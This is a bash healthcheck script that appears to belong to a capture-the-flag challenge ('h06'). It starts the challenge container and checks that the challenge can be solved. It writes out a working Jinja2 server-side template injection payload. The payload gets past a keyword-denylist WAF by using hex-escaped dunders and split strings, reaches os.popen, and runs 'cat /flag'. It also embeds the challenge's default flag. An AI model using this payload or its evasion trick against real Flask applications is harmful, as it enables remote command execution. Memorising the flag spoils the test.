#!/usr/bin/env bash
# h06 healthcheck / scripted solve: send an SSTI payload that bypasses the naive
# denylist WAF (|attr with hex-escaped dunders + string building) to reach an
# os.popen gadget and read /flag. Confirms the flag is rendered back.
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FLAG="${CHAL_FLAG-}"; [ -n "$FLAG" ] || FLAG='CYPHER{ssti_waf_bypass_ceylon}'
TARGET="${TARGET-}"; CID=""
trap '[ -n "$CID" ] && docker rm -f "$CID" >/dev/null 2>&1 || true' EXIT

if [ -z "$TARGET" ]; then
  docker build -q -t cypher-h06 "$HERE" >/dev/null
  CID="$(docker run -d -e FLAG="$FLAG" -P cypher-h06)"
  PORT="$(docker port "$CID" 8000/tcp | head -1 | sed 's/.*://')"
  TARGET="http://127.0.0.1:$PORT"
fi
for i in $(seq 1 30); do curl -fsS "$TARGET/" >/dev/null 2>&1 && break; sleep 0.5; done

# WAF-bypass payload:
#  - reach flask.helpers globals via get_flashed_messages (not blocked)
#  - dunder via |attr('\x5f\x5fglobals\x5f\x5f')  (literal "__globals__" never sent)
#  - build 'os','popen','cat /flag' by concatenation so blocked words never appear
P="{{ (get_flashed_messages|attr('\\x5f\\x5fglobals\\x5f\\x5f'))[('o'+'s')]|attr(('po'+'pen'))(('cat /fl'+'ag'))|attr('read')() }}"
echo "payload: $P"
BODY="$(curl -fsS "$TARGET/preview" --data-urlencode "template=$P")"
echo "response: $BODY"
case "$BODY" in *"$FLAG"*) echo "h06 healthcheck rc=0"; exit 0 ;; esac
echo "h06 healthcheck FAILED"; exit 1
